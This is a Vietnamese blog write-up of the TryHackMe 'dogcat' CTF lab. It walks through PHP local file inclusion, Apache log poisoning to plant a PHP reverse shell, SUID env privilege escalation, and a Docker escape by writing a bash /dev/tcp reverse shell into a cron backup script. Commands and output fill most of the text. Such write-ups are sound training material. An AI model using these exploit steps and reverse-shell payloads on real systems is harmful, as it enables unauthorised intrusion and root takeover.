---
layout: post
author: "Neo"
title: "Tryhackme - dogcat"
date: "2021-12-25"
tags: [
    "tryhackme",
	"LFI",
    "web",
    "linux",
    "ssh",
    "burpsuite",
    "docker"
]
categories: ctf
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}

![intro](/assets/img/2021-12-25-THM-dogcat/1.webp)

Xin chào, Lẩu đây. Hôm nay tôi sẽ giải CTF [Tryhackme - dogcat](https://tryhackme.com/room/dogcat)

## Reconnaissance

Vẫn như thông thường, việc đầu tiên cần làm quét cổng đang mở trên máy chủ mục tiêu

```python
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeKBugyQF6HXEU3mbcoDHQrassdoNtJToZ9jaNj4Sj9MrWISOmr0qkxNx2sHPxz89dR0ilnjCyT3YgcI5rtcwGT9RtSwlxcol5KuDveQGO8iYDgC/tjYYC9kefS1ymnbm0I4foYZh9S+erXAaXMO2Iac6nYk8jtkS2hg+vAx+7+5i4fiaLovQSYLd1R2Mu0DLnUIP7jJ1645aqYMnXxp/bi30SpJCchHeMx7zsBJpAMfpY9SYyz4jcgCGhEygvZ0jWJ+qx76/kaujl4IMZXarWAqchYufg57Hqb7KJE216q4MUUSHou1TPhJjVqk92a9rMUU2VZHJhERfMxFHVwn3H
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBouHlbsFayrqWaldHlTkZkkyVCu3jXPO1lT3oWtx/6dINbYBv0MTdTAMgXKtg6M/CVQGfjQqFS2l2wwj/4rT0s=
|   256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIfp73VYZTWg6dtrDGS/d5NoJjoc4q0Fi0Gsg3Dl+M3I
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ngay từ đầu khi đọc tiêu đề tôi tưởng đây là web server thì ít nhất sẽ có port 80, nhưng chỉ có port 22 - SSH đang mở mặc dù tôi đã thử quét lại vài lần. Sau vài phút thì tôi thử thêm IP vào file host để xem nó có ra được port 80 hay không. Và đúng là nó ra thật :unamused:

![port 80](/assets/img/2021-12-25-THM-dogcat/2.webp)

Khi click vào "A dog" hay "A cat" thì nó sẽ hiện random 1 bức ảnh về chó mèo và url sẽ hiện filter `?view=...`

Với filter này cộng thêm tiêu đề của machine này thì tôi nghĩ có thể dùng [LFI - PHP filter](https://book.hacktricks.xyz/pentesting-web/file-inclusion) để khai thác. Tôi sẽ dùng BurpSuite để phân tích request

![php-lfi](/assets/img/2021-12-25-THM-dogcat/3.webp)

Điều này có nghĩa là trong request phải có "dog" hoặc "cat". Từ đây tôi có 1 vài suy đoán, trong web server có 2 thư mục là "dog" và "cat" chứa các bức ảnh, khi chọn dog hoặc cat từ client, server sẽ trỏ vào thư mục và chọn 1 trong các bức ảnh chó(mèo). 

Và vì "dog" hay "cat" là thư mục nên tôi sẽ để nó ngay sau base64 encoder.

![index-encode](/assets/img/2021-12-25-THM-dogcat/4.webp)

Giải mã đoạn base64 này và tôi có source của trang *index.php*

```python
┌──(neo㉿kali)-[~]
└─$ echo "PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==" | base64 -d
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
                  
┌──(neo㉿kali)-[~]
└─$ 
```

Với trang *index.php* này, sau khi lấy ảnh từ thư mục, server sẽ thêm biến "ext" vào cuối. Tôi sẽ thử mở những file không phải php và thêm "ext" vào sau như thế này

![/etc/passwd](/assets/img/2021-12-25-THM-dogcat/5.webp)

Giải mã nó và tôi có nội dung file *passwd*

```python
┌──(neo㉿kali)-[~]
└─$ echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgo=" | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
             
┌──(neo㉿kali)-[~]
└─$ 
```

Trong khi tìm cách tạo RCE từ LFI thì tôi tìm được vài cách khác để khai thác thông tin, đó là khai thác thông tin từ *access.log*. Thử kiểm tra qua đường dẫn apache hoặc apache2 xem có thu được kết quả nào không. 

![access.log](/assets/img/2021-12-25-THM-dogcat/6.webp)

```python
127.0.0.1 - - [22/Aug/2022:08:09:03 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:09:39 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:10:21 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:10:59 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:11:39 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:12:18 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:12:53 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:13:29 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:14:04 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:14:40 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:15:15 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:15:51 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:16:26 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:17:02 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:17:37 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:18:13 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:18:48 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:19:24 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:19:59 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:20:30 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:21:01 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:21:31 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:22:01 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:22:32 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:23:02 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:23:32 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:24:02 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:24:33 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:25:03 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:25:33 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:26:04 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:26:34 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:27:04 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:27:34 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:28:05 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:28:35 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:29:05 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.18.3.74 - - [22/Aug/2022:08:29:20 +0000] "GET /?view=dog HTTP/1.1" 200 564 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
10.18.3.74 - - [22/Aug/2022:08:29:20 +0000] "GET /style.css HTTP/1.1" 200 698 "http://10.10.36.162/?view=dog" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
10.18.3.74 - - [22/Aug/2022:08:29:20 +0000] "GET /favicon.ico HTTP/1.1" 404 490 "http://10.10.36.162/?view=dog" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
10.18.3.74 - - [22/Aug/2022:08:29:21 +0000] "GET /dogs/10.jpg HTTP/1.1" 200 50062 "http://10.10.36.162/?view=dog" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
10.18.3.74 - - [22/Aug/2022:08:29:31 +0000] "GET /?view=dog HTTP/1.1" 200 527 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
10.18.3.74 - - [22/Aug/2022:08:29:32 +0000] "GET /dogs/10.jpg HTTP/1.1" 304 145 "http://10.10.36.162/?view=dog" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
127.0.0.1 - - [22/Aug/2022:08:29:35 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:30:06 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.18.3.74 - - [22/Aug/2022:08:30:34 +0000] "GET /?view=php://filter/convert.base64-encode/dog/resource=../../../../../../../var/log/apache2/access.log&ext HTTP/1.1" 200 1449 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
127.0.0.1 - - [22/Aug/2022:08:30:36 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:31:06 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:31:37 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:32:07 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:32:37 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:33:07 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:33:38 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.18.3.74 - - [22/Aug/2022:08:33:39 +0000] "GET /?view=php://filter/convert.base64-encode/dog/resource=../../../../../../../etc/passwd&ext&cmd=whoami HTTP/1.1" 200 1176 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
127.0.0.1 - - [22/Aug/2022:08:34:08 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:34:38 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:35:08 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:35:39 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:36:09 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:36:39 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:37:09 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.18.3.74 - - [22/Aug/2022:08:37:35 +0000] "GET /?view=php://filter/convert.base64-encode/dog/resource=../../../../../../../etc/passwd&cmd=whoami&ext HTTP/1.1" 200 1176 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
127.0.0.1 - - [22/Aug/2022:08:37:40 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:38:10 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.18.3.74 - - [22/Aug/2022:08:38:38 +0000] "GET /?view=php://filter/convert.base64-encode/dog/resource=../../../../../../../etc/passwd&cmd=whoami&ext HTTP/1.1" 200 1176 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
127.0.0.1 - - [22/Aug/2022:08:38:40 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.18.3.74 - - [22/Aug/2022:08:39:00 +0000] "GET /?view=php://filter/convert.base64-encode/dog/resource=../../../../../../../var/log/apache2/access.log&ext&cmd=whoami HTTP/1.1" 200 1884 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
127.0.0.1 - - [22/Aug/2022:08:39:10 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:39:41 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:40:11 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:40:41 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [22/Aug/2022:08:41:12 +0000] "GET / HTTP/1
```

Điều này có nghĩa là tôi có thể thực thi lệnh nào đó và nó đều sẽ lưu ở đây. Tiếp tục thử tìm kiếm và cuối cùng tôi cũng tìm được cách upload RCE. Bằng cách thay đổi *User-Agent* bằng một đoạn code PHP, tôi có thể tải lên server tệp RCE của mình. 

Đọc thêm: [From LFI to RCE!!](https://infosecwriteups.com/from-lfi-to-rce-96f352ec38c8)

Đầu tiên tạo local http server.

```python
┌──(neo㉿kali)-[~]
└─$ python3 -m http.server                                                      
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Thêm đoạn code PHP đẩy file reverse shell PHP lên server. Tôi thường dùng shell của [pentestmonkey](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) 

![upload-shell](/assets/img/2021-12-25-THM-dogcat/7.webp)

Sau đó tạo listener với port đã cấu hình bên trong file shell. Cuối cùng là truy cập file shell vừa tải lên `http://10.10.36.162/shell.php`

```python
┌──(neo㉿kali)-[~]
└─$ nc -lnvp 2402
listening on [any] 2402 ...
connect to [10.18.3.74] from (UNKNOWN) [10.10.36.162] 46762
Linux cea413fd4ac1 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 GNU/Linux
 09:08:03 up  1:02,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ pwd
/var/www/html
$ ls
cat.php
cats
dog.php
dogs
flag.php
index.php
shell.php
style.css
```

Trong *flag.php* tôi có flag 1

```python
cd ..
ls
flag2_QMW7JvaY2LvK.txt
html
```

Bên trong */var/www/* tôi tìm được flag thứ 2

## Privilege escalation

Tất nhiên là với user *www-data* tôi không thể xem quyền thực thi với root bằng `sudo -l`. Thử tìm file với SUID

```python
$ find / -type f -perm -u=s 2>/dev/null
/bin/mount
/bin/su
/bin/umount
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/env
/usr/bin/gpasswd
/usr/bin/sudo
```

Đây đều là những chương trình hệ thống, trừ `env`, vào [GTFOBins](https://gtfobins.github.io) và tôi tìm được cách leo thang đặc quyền với SUID

```python
$ /usr/bin/env /bin/sh -p
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
cd /root/
ls
flag3.txt
```

Tiếp theo, khi list các thư mục tôi để ý thấy có *.dockerenv* 

```python
$ ls -la
total 80
drwxr-xr-x   1 root root 4096 Aug 22 08:07 .
drwxr-xr-x   1 root root 4096 Aug 22 08:07 ..
-rwxr-xr-x   1 root root    0 Aug 22 08:07 .dockerenv
drwxr-xr-x   1 root root 4096 Feb 26  2020 bin
drwxr-xr-x   2 root root 4096 Feb  1  2020 boot
drwxr-xr-x   5 root root  340 Aug 22 08:08 dev
drwxr-xr-x   1 root root 4096 Aug 22 08:07 etc
drwxr-xr-x   2 root root 4096 Feb  1  2020 home
drwxr-xr-x   1 root root 4096 Feb 26  2020 lib
drwxr-xr-x   2 root root 4096 Feb 24  2020 lib64
drwxr-xr-x   2 root root 4096 Feb 24  2020 media
drwxr-xr-x   2 root root 4096 Feb 24  2020 mnt
drwxr-xr-x   1 root root 4096 Aug 22 08:08 opt
dr-xr-xr-x 106 root root    0 Aug 22 08:08 proc
drwx------   1 root root 4096 Mar 10  2020 root
drwxr-xr-x   1 root root 4096 Aug 22 09:48 run
drwxr-xr-x   1 root root 4096 Feb 26  2020 sbin
drwxr-xr-x   2 root root 4096 Feb 24  2020 srv
dr-xr-xr-x  13 root root    0 Aug 22 09:41 sys
drwxrwxrwt   1 root root 4096 Mar 10  2020 tmp
drwxr-xr-x   1 root root 4096 Feb 24  2020 usr
drwxr-xr-x   1 root root 4096 Feb 26  2020 var
```

Điều này có nghĩa là tôi đang ở trong 1 container. Sau 1 lúc tìm kiếm thì tôi tìm thấy *backup.sh* bên trong thư mục */opt*. 

```python
$ cat backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```

Tôi sẽ thêm payload vào file này bằng `echo` và sau đó tạo listener với port 9001

```python
echo "#!/bin/bash" > backup.sh
echo "/bin/bash -c 'bash -i >& /dev/tcp/10.18.3.74/9001 0>&1'" >> backup.sh
```

```python
┌──(neo㉿kali)-[~]
└─$ nc -lnvp 9001             
listening on [any] 9001 ...
connect to [10.18.3.74] from (UNKNOWN) [10.10.36.162] 35894
bash: cannot set terminal process group (7995): Inappropriate ioctl for device
bash: no job control in this shell
root@dogcat:~# 
root@dogcat:~# ls
ls
container
flag4.txt
root@dogcat:~# 
```

